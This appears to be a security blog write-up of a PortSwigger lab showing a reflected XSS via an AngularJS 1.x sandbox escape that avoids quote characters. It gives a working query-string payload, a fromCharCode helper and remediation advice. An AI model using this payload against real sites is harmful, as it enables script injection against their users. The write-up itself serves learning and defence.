---
layout: post
title: "Reflected XSS with AngularJS Sandbox Escape Without Strings"
date: 2027-06-18 09:00:00 -0500
categories: [PortSwigger, XSS]
tags: [xss, angularjs, csti, sandbox-escape, prototype-pollution, portswigger]
---

## Overview

PortSwigger lab: *Reflected XSS with AngularJS sandbox escape without strings.*

The application runs AngularJS 1.x and reflects search queries into an `ng-app` template scope. String literals (single and double quotes) are filtered, which blocks the basic `{{$on.constructor('alert(1)')()}}` payload. The lab demonstrates a sandbox escape that never touches a quote character.

**CWE-79** — Cross-site Scripting (Client-Side Template Injection variant).

---

## AngularJS CSTI — quick recap

Any AngularJS 1.x page with `ng-app` that reflects user input into template scope is vulnerable to expression injection regardless of server-side HTML encoding. `{{ }}` delimiters are parsed by Angular, not the browser HTML engine, so HTML-encoding `<` and `>` does nothing. The fingerprint is simple:

```
?search={{7*7}}
```

If the page renders `49`, the input is inside an Angular expression context.

---

## The filter

This lab filters quote characters before reflecting input. The basic payload fails:

```
{{$on.constructor('alert(1)')()}}
         ↑ filtered          ↑ filtered
```

To execute arbitrary code, the payload must build any necessary strings without using string literals.

---

## Sandbox escape mechanism

AngularJS 1.x includes a sandbox that guards property access. Internally, it walks each character of a property name using `String.prototype.charAt` to verify the name is safe. The escape overwrites that guard:

```
toString().constructor.prototype.charAt = [].join
```

`[].join` always returns `""`. Once `charAt` is replaced, the sandbox's character-by-character check never sees a forbidden value — every property access passes.

With the sandbox disabled, the payload builds its execution string using `fromCharCode`:

```
[1] | orderBy : toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41) = 1
```

`fromCharCode(120,61,97,108,101,114,116,40,49,41)` produces the string `x=alert(1)` without any quote characters. AngularJS's `orderBy` filter evaluates its argument as an expression: `x` is assigned the return of `alert(1)`, which calls `alert(1)`.

---

## Working payload

Full query string:

```
?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

`%3d` is the URL-encoding of `=` — needed because a literal `=` in the query key position would be misinterpreted as a key/value separator.

To compute `fromCharCode` values for any payload string:

```python
",".join(str(ord(c)) for c in "x=alert(1)")
# 120,61,97,108,101,114,116,40,49,41
```

---

## Why curl doesn't work

AngularJS runs entirely in the browser. The server only reflects the query string into the HTML response; the expression evaluation and `alert()` call happen in the JavaScript engine. A `curl` request receives the raw HTML but never executes it. Selenium headless Chromium is required to confirm the solve.

---

## Fix

- **Never reflect untrusted input into an AngularJS template scope.** Use `ng-bind` (text-only binding) instead of `{{ }}` interpolation for user-controlled values.
- **Migrate from AngularJS 1.x** (end-of-life 2021) to Angular 2+, which removed the expression sandbox and the entire CSTI attack surface.
- A Content Security Policy that disallows CDN-hosted AngularJS will prevent attacker-injected Angular from running on pages that don't already include it — but cannot protect a page that already has `ng-app`.

---

*Solved via headless Selenium. Lab marked `is-solved` on first poll.*
